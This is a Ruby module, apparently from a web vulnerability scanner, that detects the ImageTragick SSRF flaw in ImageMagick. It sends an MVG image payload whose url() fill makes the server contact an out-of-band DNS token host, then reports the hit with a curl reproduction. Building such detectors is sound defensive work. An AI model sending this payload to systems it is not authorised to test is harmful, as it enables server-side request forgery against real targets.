require 'cgi'

module ScannerExtensions
  module Extensions
    class ImageTragickSsrf < BaseExtension
      def initialize
        @type                = :detect
        @general_object_type = :param
        @extension_type      = :vuln
        @detect_type         = :rce
        @point               = ->(p) { p.to_a.last.to_s == 'file' }

        @defaults = {
          timeout: 15,
          sleep: 15
        }

        @payloads = [
          ERB.new(
            <<-fin.margin
              |push graphic-context
              |viewbox 0 0 640 480
              |fill 'url(http://<%= token %>/)'
              |pop graphic-context
            fin
          )
        ]
      end

      def oob_callback(object, tokens)
        tokens.each do |token, data|
          array = ScannerExtensions::Helpers::OobDnsClient.get token

          next if array.empty?
          curl = object.curl_helper(value: data)
          object.vuln(
            extension: 'image_tragick_ssrf',
            template: '/ssrf/image_tragick',
            binding: :protocol,
            args: {
              exploit_example: curl,
              footers: {
                exploit_example: {
                  view: 'oob_dns',
                  splitter: "\n",
                  params: {
                    hosts: array
                  }
                }
              }
            }
          )
          return object
        end
        return nil
      end

      def run(object, params)
        params = @defaults.merge(params)

        tokens = []

        for payload in @payloads do
          token = ScannerExtensions::Helpers::OobDnsClient.create
          data  = payload.result(Kernel.binding)

          object.http(value: data, timeout: params[:timeout], open_timeout: params[:open_timeout])

          tokens << [token, data]
        end

        if object.oob_callbacks
          object.oob_callbacks << Proc.new do
            oob_callback(object, tokens)
          end
        else
          sleep params[:sleep]
          oob_callback(object, tokens)
        end
      end
    end
  end
end
